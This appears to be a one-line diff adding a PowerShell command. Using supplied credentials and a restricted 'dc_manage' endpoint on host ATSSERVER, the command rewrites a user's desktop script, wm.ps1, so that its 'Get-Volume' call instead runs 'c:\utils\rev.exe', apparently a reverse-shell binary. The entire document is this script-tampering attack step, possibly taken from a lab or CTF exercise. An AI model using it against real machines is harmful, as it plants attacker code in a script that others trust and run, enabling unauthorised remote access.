@@ -1,0 +1,1 @@
+Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\rev.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred
